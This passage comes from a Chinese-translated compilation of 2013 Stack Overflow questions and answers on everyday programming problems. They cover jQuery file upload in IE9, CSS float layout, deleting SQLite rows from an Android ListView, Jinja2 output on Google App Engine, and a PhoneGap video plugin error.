<ul id="imageRings">
    <li><img class="rotate" src="images/ring1.png"></li>
    <li><img class="rotate" src="images/ring2.png"></li>
    <li><img class="rotate" src="images/ring3.png"></li>
    <li><img class="rotate" src="images/ring4.png"></li>
    <li><img class="rotate" src="images/ring5.png"></li>
    <li><img class="rotate" src="images/ring6.png"></li>
    <li><img class="rotate" src="images/ring7.png"></li>
    <li><img class="rotate" src="images/ring8.png"></li>
</ul>
<div class="rect"></div>​ 
```

**jQuery**

```
$('imageRings img').on({
    mouseenter: function() {
        $(this).closest('li').append($('.rect'));
        $('.rect').show();
    },
    mouseleave: function() {
        $('.rect').hide()
    }
})​; 
```

**CSS**

```
#imageRings li{display:inline-block;}
.rect{border:1px solid red;background:#a55;height:20px;display:none;}​ 
```

# jquery - IE 9 中的 jQuery 图片上传 (blueimp) 报告错误

> ID：14111754
> 
> 赞同：0
> 
> 时间：2013-01-01T15:39:38.770
> 
> 标签：jquery, upload, blueimp

我的代码在 Chrome 中运行良好，但在 IE 中出错。消息是：

> 空文件上传结果

并且 IE 显示跨站点脚本错误消息。但是文件上传效果很好。

我只用我的服务器链接更改了“main.js”。

```
$(function () {
  'use strict';

// Initialize the jQuery File Upload widget:
$('#fileupload').fileupload({
    // Uncomment the following to send cross-domain cookies:
    //xhrFields: {withCredentials: true},
//  url: 'server/php/'
    url: './jQuery-File-Upload-master/server/php/'
});

// Enable iframe cross-domain access via redirect option:
$('#fileupload').fileupload(
    'option',
    'redirect',
    window.location.href.replace(
        /\/[^\/]*$/,
        './jQuery-File-Upload-master/cors/result.html?%s'
    )
);

if (window.location.hostname === 'mimong4.cafe24.com') {
    // Demo settings:
    $('#fileupload').fileupload('option', {
        url: './jQuery-File-Upload-master/server/php/index.php',
        maxFileSize: 5000000,
        acceptFileTypes: /(\.|\/)(gif|jpe?g|png)$/I,
        process: [
            {
                action: 'load',
                fileTypes: /^image\/(gif|jpeg|png)$/,
                maxFileSize: 20000000 // 20MB
            },
            {
                action: 'resize',
                maxWidth: 1440,
                maxHeight: 900
            },
            {
                action: 'save'
            }
        ]
    });
    // Upload server status check for browsers with CORS support:
    if ($.support.cors) {
        $.ajax({
            url: './jQuery-File-Upload-master/server/php/index.php',
            type: 'HEAD'
        }).fail(function () {
            $('<span class="alert alert-error"/>')
                .text('Upload server currently unavailable - ' +
                        new Date())
                .appendTo('#fileupload');
        });
    }
} else {
    // Load existing files:
    $.ajax({
        // Uncomment the following to send cross-domain cookies:
        //xhrFields: {withCredentials: true},
        url: $('#fileupload').fileupload('option', 'url'),
        dataType: 'json',
        context: $('#fileupload')[0]
    }).done(function (result) {
        $(this).fileupload('option', 'done')
            .call(this, null, {result: result});
    });
}

}); 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-11T07:48:49.053

IE9 使用跨站点 iframe 传输。

第三个参数应该是指向 cors/result.html 的 url，它应该位于源服务器（而不是您的上传服务器）上，以克服跨域问题。

```
// Enable iframe cross-domain access via redirect option:
$('#fileupload').fileupload(
    'option',
    'redirect',
    'http://mimong4.cafe24.com/result.html?%s'
    )
); 
```

[https://github.com/blueimp/jQuery-File-Upload/wiki/Cross-domain-uploads](https://github.com/blueimp/jQuery-File-Upload/wiki/Cross-domain-uploads)

# xcode - 从一组路径生成可选择的文件夹和文件

> ID：14111761
> 
> 赞同：-1
> 
> 时间：2013-01-01T15:41:13.793
> 
> 标签：xcode, macos

`program.txt`我正在使用 xcode，我需要从文本文件 ( ) 格式的目录中生成文件夹/文件列表（可以使用复选框选择）。

program.txt 文件包含下面提到的路径：

```
2282_program_18-Oct-09_Cam1/
2282_program_18-Oct-09_Cam1/BRM90001_01.MP4
2282_program_18-Oct-09_Cam1/BRM90001_02.MP4
2282_program_18-Oct-09_Cam21/
2282_program_18-Oct-09_Cam1/BRM90002_01.MP4
2282_program_18-Oct-09_Cam1/BRM90002_02.MP4 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-05T16:22:18.613

`NSString`您可以使用方法读取文件[`-stringWithContentsOfURL:usedEncoding:error:`](https://developer.apple.com/library/mac/#documentation/Cocoa/Reference/Foundation/Classes/NSString_Class/Reference/NSString.html)。`NSString`接下来，您可以按照名为[Separating a String "By Paragraph"](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/Strings/Articles/stringsParagraphBreaks.html#//apple_ref/doc/uid/TP40005016-SW1)的文档部分中的描述按段落分隔它。

完成此操作后，您可能希望创建一个[`NSTableView`](https://developer.apple.com/library/mac/#documentation/Cocoa/Conceptual/TableView/Introduction/Introduction.html)包含文件路径的列，以及其中包含复选框的另一列。

# html - 对齐标题旁边的文本

> ID：14111765
> 
> 赞同：1
> 
> 时间：2013-01-01T15:41:40.487
> 
> 标签：html, css

我确定以前有人问过这个问题，但我不太确定如何用词来表达我的搜索。

我想要一份事实清单，左边是标题，右边是信息。这是我到目前为止所拥有的：

![这就是我想要的样子](../Images/88f48fe1e2037288aee76761199fd885.png)

但是，如果我在右边放太多文字，它不会保持正确对齐，而是在标题下方。

![看起来不对](../Images/6c58c4dd5dbf2f9817fb3362abc4c215.png)

如何让文本保持在右侧对齐？这是我正在使用的 CSS：

```
.about-fact {
    border-bottom: 1px dotted #aaa;
    padding: 10px 0;
}
.about-headline {
    display: inline-block;      /* Aligns the content to be the same */
    width: 100px;
    float:left;
    font-weight: bold;
}
.about-value {

} 
```

示例 HTML：

```
<div class="about-fact">
    <div class="about-headline">Profession:</div>
    <div class="about-value">Studying Computer Science at Carleton University</div>
</div>
<div class="about-fact">
    <div class="about-headline">Experience:</div>
    <div class="about-value">Resume</div>
</div> 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T15:43:35.410

### 建议

1.  添加`overflow: hidden;`到父级。
2.  删除`inline-block;`.
3.  `float`将和添加`width`到`.about-value`.

### 更改 CSS 以包含浮动。

```
.about-fact {
    border-bottom: 1px dotted #aaa;
    padding: 10px 0;
    overflow: hidden;
}
.about-headline {
    width: 100px;
    float: left;
    font-weight: bold;
}
.about-value {
    float: left;
    width: auto;
} 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-01T15:56:17.120

让我们首先让标记更加语义化：

```
<dl class="about-facts">
    <dt>Profession:</dt>
    <dd>Studying Computer Science at Carleton University</dd>
    <dt>Experience:</dt>
    <dd>Resume</dd>
</dl>​ 
```

当然，这也需要对 CSS 进行更改。因为不再有 wrapping `div`，要让边框一直向左延伸，我们需要设置`padding-left`not `margin-left`：

```
.about-facts dt {
    padding: 10px 0;
}
.about-facts dt {
    width: 100px;
    float: left;
    font-weight: bold;
}
.about-facts dd {
    padding: 10px 0 10px 120px;
    border-bottom: 1px dotted #aaa;
} 
```

JSFiddle：http: [//jsfiddle.net/ekMZ6/1/](http://jsfiddle.net/ekMZ6/1/)

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2013-01-01T15:46:05.370

试试这个 CSS

```
.about-value {
    margin-left: 100px;
}​ 
```

演示：http: [//jsfiddle.net/k4aQ5/](http://jsfiddle.net/k4aQ5/)

# umbraco - 在 Visual Studio 2010 中执行 Umbraco 4.11.1 源代码

> ID：14111766
> 
> 赞同：1
> 
> 时间：2013-01-01T15:41:54.293
> 
> 标签：umbraco, opencms

毫无疑问，我花了很多时间来解决 Umbraco 问题……但没有成功。我想要的是……学习使用 Umbraco 4.11.1 版本（我知道 Umbraco 5 是最新的），但对此知之甚少。Umbraco 的支持似乎也不足。

**我想使用 Visual Studio 2010 Professional 运行 Umbraco，但没有成功。**首先，我找不到我能理解的 umbraco 源代码。我从以下链接下载了源代码：

[http://umbraco.codeplex.com/releases/view/98167](http://umbraco.codeplex.com/releases/view/98167)

下载后我得到以下文件夹：.nuget Umbraco.Extensions Umbraco.Site UmbracoProject（解决方案文件）

但是当我尝试通过 Visual Studio 2010 打开此解决方案文件时，我收到错误消息：说所选文件是解决方案文件，但由新版本的应用程序创建。

我不明白为什么我不能在 Visual Studio 中打开源代码？请帮帮我。任何帮助，将不胜感激。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T17:01:16.213

除非您想在 Umbraco 核心上进行实际开发，否则您不需要下载 Umbraco 源代码。为了能够通过 Visual Studio 打开 Umbraco 以编辑 cshtml 文件、模板等，请设置一个 Umbraco 实例（通过 WebMatrix 或手动执行），然后将项目作为网站打开。

有关详细信息，请参阅[为 Umbraco 设置本地开发环境。](https://stackoverflow.com/questions/10296463/setting-up-local-development-environment-for-umbraco)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-02T09:22:25.653

@DouglasLudlow 似乎回答了您最初的问题；但此外：

Umbraco 5 的开发在几个月前就停止了，Umbraco 4.11 是 Umbraco 的最新版本。

如果您有一个工作的 Umbraco 4.x 版本，那么下一步是观看描述 Umbraco 各个部分的[免费培训视频](http://umbraco.com/products/umbracotv)。具体来说，razor 脚本保存在 Umbraco 后台“开发人员”部分的脚本文件部分 - 以及 umbraco 项目的宏脚本文件夹中。

![在此处输入图像描述](../Images/9c380077396dba695a41061877baf82f.png)

# macos - NSScrollView，弹性和在视图边界之外绘制

> ID：14111768
> 
> 赞同：4
> 
> 时间：2013-01-01T15:42:23.293
> 
> 标签：macos, cocoa, nsscrollview

我正在尝试使用 NSScrollView 重新创建一些可以在 Apples Calendar 应用程序 (osx) 中看到的功能。当您在日历应用程序中向上和向下滚动超出视图边界时，它不仅仅是一个空白区域，而是从日历本身扩展了网格线。我想知道如何做到这一点？我希望答案会很简单。比如绘制比需要更大的内容视图，然后在滚动视图上设置一些属性来限制它认为是可滚动内容的内容。在翻阅 NSScrollView 文档后，我还没有找到任何线索。如果答案相对简单，请原谅我，并感谢您的任何答案。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2014-03-14T15:26:49.037

设置滚动视图的背景以绘制正确的背景......这会重复日历效果，因为没有动态内容

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2014-03-14T15:14:14.247

这是从 Stackoverflow 上其他人的代码中采用的。此代码在表格顶部绘制水平网格。我想您也可以将其更改为绘制垂直网格。把它放在你的`NSTableView`子类中：

```
- (void)drawGridInClipRect:(NSRect)clipRect
{
    NSRect boundsToDraw = clipRect;
    CGFloat   yStart   = 0;

    if ( clipRect.origin.y < 0 ) {

        while (yStart > NSMinY(boundsToDraw)) {

            CGFloat yRowTop = yStart - self.rowHeight;

            NSRect rowFrame = NSMakeRect(0, yRowTop, boundsToDraw.size.width, 1.0);

            [[self gridColor] set];

            NSRectFill(rowFrame);

            yStart -= self.rowHeight;

        }
    }
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-01T15:56:24.470

它几乎就像 NSScrollView 文档所说的那样。利用：

```
-(void)setDocumentView:(NSView *)aView 
```

在上面设置一个 NSClipView。这会保存大于显示部分的绘制内容，并将滚动不可见的部分进入视图。您还应该看看“可可绘图指南”。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2015-10-06T09:50:52.560

您可以使用半私有方法在文档视图之外绘制：

```
- (void)drawBackgroundOverhangInRect:(NSRect)dirtyRect {
    [[NSColor cyanColor] set];
    NSRectFill(dirtyRect);
} 
```

10.7 后可用

# android - 如何在列表视图中由用户在 Android 应用程序中删除 Sqlite 数据库中的一行

> ID：14111769
> 
> 赞同：1
> 
> 时间：2013-01-01T15:42:36.180
> 
> 标签：android, database, sqlite, row

我用 SQLite 数据库制作了一个 Android 应用程序。我希望用户能够在列表视图中选择数据库的一行并能够删除该特定行。我已经有了数据库和列表视图。但我不知道如何删除一行。有人可以帮帮我吗？这是我的数据库助手：

```
package com.persoonlijk.rooster.test2;

import android.content.Context;
import android.database.Cursor;
import android.database.sqlite.SQLiteDatabase;
import android.database.sqlite.SQLiteOpenHelper;
import android.database.sqlite.SQLiteStatement;
import java.util.ArrayList;
import java.util.List;

public class DataManipulator
{
public static final String KEY_ROWID = "id";
public static final String KEY_DAG = "dag";
public static final String KEY_UUR = "uur";
public static final String KEY_VAK = "vak";
public static final String KEY_LOKAAL = "lokaal";

    private static final String DATABASE_NAME = "mydatabase.db";
    static final String TABLE_NAME = "newtable";
    private static final int DATABASE_VERSION = 11;

    private static Context context;
    static SQLiteDatabase db;

    private SQLiteStatement insertStmt;
    private static final String INSERT = "insert into " + TABLE_NAME + "           (dag,uur,vak,lokaal) values (?,?,?,?)";
   public DataManipulator(Context context) {
   DataManipulator.context = context;
   OpenHelper openHelper = new OpenHelper(DataManipulator.context);
   DataManipulator.db = openHelper.getWritableDatabase();
   this.insertStmt = DataManipulator.db.compileStatement(INSERT);
   }

  public long insert(String dag,String uur,String vak,String lokaal) {
  this.insertStmt.bindString(1, dag);
  this.insertStmt.bindString(2, uur);
  this.insertStmt.bindString(3, vak);
  this.insertStmt.bindString(4, lokaal);
  return this.insertStmt.executeInsert();
  }

  public void deleteAll() {
  db.delete(TABLE_NAME, null, null);
  }

  public List<String[]> selectAll()
  {
  List<String[]> list = new ArrayList<String[]>();
  Cursor cursor = db.query(TABLE_NAME, new String[] { "id","dag","uur","vak","lokaal"  }, null, null, null, null, "dag asc");
  int x=0;
  if (cursor.moveToFirst()) {
   do {
    String[] b1=new String[]    {cursor.getString(0),cursor.getString(1),cursor.getString(2),
  cursor.getString(3),cursor.getString(4)};
    list.add(b1);
    x=x+1;
   } while (cursor.moveToNext());
   }
  if (cursor != null && !cursor.isClosed()) {
   cursor.close();
   }
  cursor.close();
   return list;
  }

  public void delete(int rowId) {
  db.delete(TABLE_NAME, null, null);
  }

  private static class OpenHelper extends SQLiteOpenHelper {
  OpenHelper(Context context) {
     super(context, DATABASE_NAME, null, DATABASE_VERSION);
  }

 @Override
 public void onCreate(SQLiteDatabase db) {
     db.execSQL("CREATE TABLE " + TABLE_NAME + " (id INTEGER PRIMARY KEY, dag TEXT,  uur TEXT, vak TEXT, lokaal TEXT)");
 }
@Override
public void onUpgrade(SQLiteDatabase db, int oldVersion, int newVersion)
    {
     db.execSQL("DROP TABLE IF EXISTS " + TABLE_NAME);
     onCreate(db);
 }
 }

 } 
```

这是我对数据库中数据的列表视图：package com.persoonlijk.rooster.test2；

```
 import java.util.ArrayList;
 import java.util.List;

 import com.persoonlijk.rooster.test2.SaveData;

import android.app.ListActivity;
import android.content.Intent;
import android.os.Bundle;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.ArrayAdapter;
import android.widget.Button;
import android.widget.ListView;
import android.widget.TextView;
import android.view.View.OnClickListener;
import android.app.Activity;

public class MainActivity extends ListActivity{    
  TextView selection;
  public int idToModify;
  DataManipulator dm;

  List<String[]> list = new ArrayList<String[]>();
  List<String[]> names2 =null ;
  String[] stg1;

/** Called when the activity is first created. */
@Override
public void onCreate(Bundle savedInstanceState){
super.onCreate(savedInstanceState);
setContentView(R.layout.check);

    dm = new DataManipulator(this);
    names2 = dm.selectAll();

   stg1=new String[names2.size()];
   int x=0;
   String stg;

  for (String[] dag : names2) {
    stg = dag[1]+" - "+dag[2]+ " - "+dag[3]+" - "+dag[4];
    stg1[x]=stg;
    x++;
 }

ArrayAdapter<String> adapter = new ArrayAdapter<String>   (this,android.R.layout.simple_list_item_1,stg1);
    this.setListAdapter(adapter);
selection=(TextView)findViewById(R.id.selection);

 }     

 public void onListItemClick(ListView parent, View v, int position, long id) {
  selection.setText(stg1[position]);
 }

 //menuknoppen

 @Override
  public boolean onCreateOptionsMenu(Menu menu) {
    menu.add(Menu.NONE, 0, 0, "Voeg gegevens toe");
    menu.add(Menu.NONE, 1, 1, "Verwijder gegevens");
    return super.onCreateOptionsMenu(menu);
 }

 @Override
 public boolean onOptionsItemSelected(MenuItem item) {
     switch (item.getItemId()) {
       case 0:
       startActivity(new Intent(this, SaveData.class));
       return true;
       case 1:
           startActivity(new Intent(this, VerwijderData.class));
           return true;
  }
  return false;
  }

 } 
```

这就是代码现在的样子：package com.persoonlijk.rooster.test2；

```
import java.util.ArrayList;
import java.util.List;

import android.app.ListActivity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

public class MainActivity extends ListActivity{    
   TextView selection;
   public int idToModify;
   DataManipulator dm;

   List<String[]> list = new ArrayList<String[]>();
   List<String[]> names2 =null ;
   String[] stg1;

   /** Called when the activity is first created. */
   @Override
   public void onCreate(Bundle savedInstanceState){
   super.onCreate(savedInstanceState);
   setContentView(R.layout.check);

    dm = new DataManipulator(this);
    names2 = dm.selectAll();

   stg1=new String[names2.size()];
   int x=0;
   String stg;

   for (String[] dag : names2) {
       stg = dag[1]+" - "+dag[2]+ " - "+dag[3]+" - "+dag[4];
       stg1[x]=stg;
       x++;
    }

  ArrayAdapter<String> adapter = new ArrayAdapter<String>      (this,android.R.layout.simple_list_item_1,stg1);
    this.setListAdapter(adapter);
     selection=(TextView)findViewById(R.id.selection);
   }  

  //menuknoppen
   @Override
  public boolean onCreateOptionsMenu(Menu menu) {
      menu.add(Menu.NONE, 0, 0, "Voeg gegevens toe");
      menu.add(Menu.NONE, 1, 1, "Verwijder gegevens");
      return super.onCreateOptionsMenu(menu);
   }

  @Override
   public boolean onOptionsItemSelected(MenuItem item) {
   switch (item.getItemId()) {
       case 0:
           startActivity(new Intent(this, SaveData.class));
       return true;
       case 1:
           startActivity(new Intent(this, VerwijderData.class));
       return true;

  }
  return false;
  }

  } 
```

现在，在我的 MainActivity 菜单中，您可以单击“verwijder”，然后转到 VerwijderData 活动。这个 VerwijderData Activity 曾经是 MainActivity。在 VerwijderData 活动中，用户删除了数据，这是我的应用程序不会自行刷新的活动。这是来自 VerwijderData 活动的代码：package com.persoonlijk.rooster.test2；

```
import java.util.ArrayList;
import java.util.List;

import android.app.ListActivity;
import android.content.Intent;
import android.os.Bundle;
import android.util.Log;
import android.view.ContextMenu;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.AdapterView;
import android.widget.ArrayAdapter;
import android.widget.ListView;
import android.widget.TextView;

public class VerwijderData extends ListActivity{    
  TextView selection;
  public int idToModify;
  DataManipulator dm;
  ArrayAdapter<String> adapter;

  List<String[]> list = new ArrayList<String[]>();
  List<String[]> names2 =null ;
  String[] stg1;

  /** Called when the activity is first created. */
  @Override
  public void onCreate(Bundle savedInstanceState){
  super.onCreate(savedInstanceState);
  setContentView(R.layout.verwijder);

    dm = new DataManipulator(this);
    names2 = dm.selectAll();

   stg1=new String[names2.size()];
   int x=0;
   String stg;

   for (String[] dag : names2) {
       stg = dag[1]+" - "+dag[2]+ " - "+dag[3]+" - "+dag[4];
       stg1[x]=stg;
       x++;
   }

  adapter = new ArrayAdapter<String>   (this,android.R.layout.simple_list_item_1,stg1);
  this.setListAdapter(adapter);
  selection=(TextView)findViewById(R.id.selection);

 }  

  public void onListItemClick(ListView parent, View v, int position, long id) {
     String[] delete = names2.get(position);
     String idString = delete[0];
     long idLong = Long.valueOf(idString);
     Log.d("Deleting...", idLong + "");
     dm.delete(idLong);
     names2.remove(position);

     stg1=new String[names2.size()];
     int x=0;
     String stg;

     for (String[] dag : names2) {
         stg = dag[1]+" - "+dag[2]+ " - "+dag[3]+" - "+dag[4];
         stg1[x]=stg;
         x++;
     }
     adapter.notifyDataSetChanged();

  }

  } 
```

自从我第一次提出问题以来，我的应用程序发生了一些变化，希望您仍然理解我的意思。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-01T16:57:21.697

首先，我们需要重新设计您的数据库删除方法。它不会像现在这样做任何事情。

```
public boolean delete(long rowId) {
/*      this is what your database delete method should look like
        this method deletes by id, the first column in your database*/
        return db.delete(TABLE_NAME, KEY_ROWID + "=" + rowId, null) > 0;
    } 
```

现在剩下的在 Activity 的`onListItemClick`方法中

```
 public void onListItemClick(ListView parent, View v, int position, long id) {
/*      it looks like you're using an ArrayAdapter so you're gonna need to delete
        both from the listview and from the database. 
        first we refer specifically to the corresponding item in the list by position
        which is provided by the listItemClick parameter*/
        String[] delete = names2.get(position);
/*      we do this because we want the id to delete by in the database by id
        based on your dm.selectAll() method, it should be at the first index of the array*/
        String idString = delete[0];
//      you've made it into a string, but we need it back to being a long value
        long idLong = Long.valueOf(idString);
        Log.d("Deleting...", idLong + "");
/*      i put in the log statement for debugging purposes, it will put the id value on Logcat
        so if something goes wrong, we can at least rule out the step since we see the value being
        removed, but!
        finally we can delete it from our database because we have the parameter we need*/
        dm.delete(idLong);
/*      There it's done, but surely you want it off the listview too so no one is confused. 
        unfortunately you've made stg1 an array so we can't just remove the index from it*/
        names2.remove(position);

        stg1=new String[names2.size()];
        int x=0;
        String stg;

        for (String[] dag : names2) {
            stg = dag[1]+" - "+dag[2]+ " - "+dag[3]+" - "+dag[4];
            stg1[x]=stg;
            x++;
        }
/*      can you see what happened? the `List` collection is able have its components dynamically
        added and removed, so i removed from that, then i remade the stg1 collection using your method.*/
        adapter.notifyDataSetChanged();
//      ^ that command refreshes the listview to see changes.
    } 
```

考虑到所有因素，您已经使这项任务变得比当前设置所需的繁琐得多。首先，在输入到适配器之前，您已经制作了大量的中间集合，然后您将数组作为数据源，不能动态调整大小。

更令人满意的是使用`CursorAdapter`. 然后您可以使用`ListItemClick`方法上提供的 id 参数，因为它是我们想要的确切 id。此外，您只需要从一个数据库源中删除，然后只需刷新适配器即可。

* * *

使您的适配器成为像其他一些变量一样的字段，以便在整个类中引用它：

```
public class MainActivity extends ListActivity{    
    TextView selection;
    public int idToModify;
    DataManipulator dm;
    ......
    ArrayAdapter<String> adapter; <--------- add that

    /** Called when the activity is first created. */
    @Override
    public void onCreate(Bundle savedInstanceState){
        super.onCreate(savedInstanceState);
        setContentView(R.layout.check);
        .........
        adapter = new ArrayAdapter<String>   (this,android.R.layout.simple_list_item_1,stg1); <------ edit that
        this.setListAdapter(adapter);
    }     

} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-01T16:08:02.593

### 创建上下文菜单并添加菜单项“删除”并从适配器或数据库中删除该项目。

### 在这里，我刚刚从适配器中删除了项目。请通过 SQliteOpenHelper 调用您的删除方法

```
 public void onCreateContextMenu(android.view.ContextMenu menu, View v, ContextMenuInfo menuInfo)    
 {
    super.onCreateContextMenu(menu, v, menuInfo);
    MenuInflater inflater = getMenuInflater();
    inflater.inflate(R.menu.contextmenu, menu);
 }

    @Override
     public boolean onContextItemSelected(MenuItem item) 
     {
        AdapterContextMenuInfo info = (AdapterContextMenuInfo) item.getMenuInfo();
        switch (item.getItemId()) {
           case R.id.deleteItem:
           //here's my question mark :)
           adapter.remove(adapter.getItem(info.position));
           adapter.notifyDataSetChanged();
           return true;
         default:
           return super.onContextItemSelected(item);
       }
     } 
```

# android - 如何使用 ActionBarSherlock 更改菜单的背景颜色

> ID：14111771
> 
> 赞同：0
> 
> 时间：2013-01-01T15:42:43.550
> 
> 标签：android, styles, actionbarsherlock

我正在尝试更改菜单的背景颜色，但仍然得到相同的结果。我想将我的菜单设置为白色背景。我的菜单看起来像这样

```
<item

    android:id="@+id/exit"
    android:icon="@drawable/exit"
    android:orderInCategory="1"
    android:title="exit">
</item>

<item
    android:id="@+id/about"
    android:icon="@drawable/get_info"
    android:title="about">
</item> 
```

我的风格看起来像这样

```
<resources>

    <style name="AppTheme" parent="android:Theme.Light" />

</resources> 
```

代码是：

```
public boolean onCreateOptionsMenu(Menu menu) {
    getSupportMenuInflater().inflate(R.menu.menu, menu);
    MenuInflater inflater = getSupportMenuInflater();
    inflater.inflate(R.menu.submenu, menu);
    return super.onCreateOptionsMenu(menu);
} 
```

我希望我的菜单背景是白色的，而不是默认的 android 样式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-01T15:44:59.510

像这样更改 actionBar 背景：

```
View actionBarView = getLayoutInflater().inflate(R.layout.action_bar_custom_view, null);
        actionBar.setCustomView(actionBarView);
        actionBar.setDisplayOptions(ActionBar.DISPLAY_SHOW_CUSTOM); 
```

# python - GAE 上的 jinja2 在每个回复中都写出“无”

> ID：14111772
> 
> 赞同：3
> 
> 时间：2013-01-01T15:42:59.003
> 
> 标签：python, google-app-engine, templates, jinja2

`None`无论处理程序的输出多么简单，我都会在每个响应的末尾得到一个字符串。

这是我的处理程序代码：

```
class BaseHandler(webapp2.RequestHandler):
    @webapp2.cached_property
    def jinja2(self):
        return jinja2.get_jinja2(app=self.app)

    def render_response(self, _template, **context):
        rv = self.jinja2.render_template(_template, **context)
        self.response.write(rv)

class SimpleHandler(BaseHandler):
     def get(self):
        template_values = {
            'error' : "",
            'url' : os.path.basename(self.request.url)
        }

        self.render_response('temp.html', **template_values) 
```

模板：

```
<!DOCTYPE html>
<html>
    <head>
        <title>Home</title> 
                <script src="http://code.jquery.com/jquery-1.8.2.js"></script>
    </head>
    <body>
        <div></div>
        <div>
            Test
        </div>
        <div>{{ error }}</div>
    </body>
</html> 
```

最后是输出

```
Test
None 
```

在此之后，每个输出的末尾都包含字符串“None”。帮助表示赞赏！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-01T22:46:43.030

需要注意的一点是，`None`它将返回一个空值（请参阅[此答案](https://stackoverflow.com/questions/2695180/jinja2-returns-none-string-for-google-app-engine-models)）。为了处理它，您可以执行以下操作以确保`error`仅在存在时才打印 an：

```
<html>
    <head>
        <title>Home</title> 
        <script src="http://code.jquery.com/jquery-1.8.2.js"></script>
    </head>
    <body>
        <div></div>
        <div>
            Test
        </div>
        <!-- Here we check to see 'error' is not null; if not, print -->
        {% if error %}
            <div>{{ error }}</div>
        {% endif %}
    </body>
</html> 
```

# android - 使用 Phonegap 和 Video Player 插件播放视频时出现网络错误

> ID：14111773
> 
> 赞同：0
> 
> 时间：2013-01-01T15:43:06.773
> 
> 标签：android, cordova, video, phonegap-plugins

我正在尝试使用[此插件](http://simonmacdonald.blogspot.dk/2011/11/video-player-plugin-for-phonegap.html)在 Android 上使用 Phonegap 播放视频。

但我不断收到此错误：“出现网络错误（file:///android_asset/www/window.plugins.videoPlayer.play('http://www.youtube.com/watch?v=sARyVV0Eyv8')”

该视频是一个随机的 Youtube。

我按照插件页面（上图）中的所有步骤进行操作，并尝试像这样播放视频：

a href="window.plugins.videoPlayer.play('http://www.youtube.com/watch?v=sARyVV0Eyv8')" （<>在此处删除）

但是错误总是存在的。这是猫日志：

```
01-01 15:10:36.554: E/generateWebResourceResponse(2286): /watch
01-01 15:10:36.554: E/generateWebResourceResponse(2286): java.io.FileNotFoundException:     /watch
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at     android.content.res.AssetManager.openAsset(Native Method)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.content.res.AssetManager.open(AssetManager.java:315)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at     org.apache.cordova.IceCreamCordovaWebViewClient.generateWebResourceResponse(IceCreamCordovaWebViewClient.java:73)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at org.apache.cordova.IceCreamCordovaWebViewClient.shouldInterceptRequest(IceCreamCordovaWebViewClient.java:46)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.CallbackProxy.shouldInterceptRequest(CallbackProxy.java:1111)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.BrowserFrame.shouldInterceptRequest(BrowserFrame.java:863)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewCore.nativeMouseClick(Native Method)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewCore.access$6800(WebViewCore.java:57)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewCore$EventHub.dispatchWebKitEvent(WebViewCore.java:1788)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewInputDispatcher.dispatchWebKitEvent(WebViewInputDispatcher.java:689)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewInputDispatcher.dispatchWebKitEvents(WebViewInputDispatcher.java:639)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewInputDispatcher.access$800(WebViewInputDispatcher.java:78)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewInputDispatcher$WebKitHandler.handleMessage(WebViewInputDispatcher.java:1153)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.os.Handler.dispatchMessage(Handler.java:99)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.os.Looper.loop(Looper.java:137)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at android.webkit.WebViewCore$WebCoreThread.run(WebViewCore.java:812)
01-01 15:10:36.554: E/generateWebResourceResponse(2286):    at java.lang.Thread.run(Thread.java:856) 
```

我错过了什么？

编辑，以回应西蒙麦克唐纳的回答和下面的第二条评论：
我正在准备设备。video.js 在我的 www 文件夹中，并像这样从 html 中引用（包括其他 js 引用）：

```
<script type="text/javascript" src="cordova-2.2.0.js"></script>
<script type="text/javascript" src="js/index.js"></script>
<script type="text/javascript" charset="utf-8" src="video.js"></script> 
```

我的插件行：

```
<plugin name="VideoPlayer" value="com.phonegap.plugins.video.VideoPlayer"/> 
```

与其他 phonegap 插件一起位于 assets/www/res/xml/config.xml 中。

我将 println 和 Log.e 语句放在 VideoPlayer.java pluginResult 和 playVideo 中，但据我所知，它们没有被调用。

更多细节：我正在使用cordova-2.2.0.js

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-02T03:22:37.840

您的 HTML 无效。它应该是：

```
<a href="javascript:window.plugins.videoPlayer.play('http://www.youtube.com/watch?v=sARyVV0Eyv8')">Play me</a> 
```

# d - 从 D 中的网页读取数据？

> ID：14111778
> 
> 赞同：2
> 
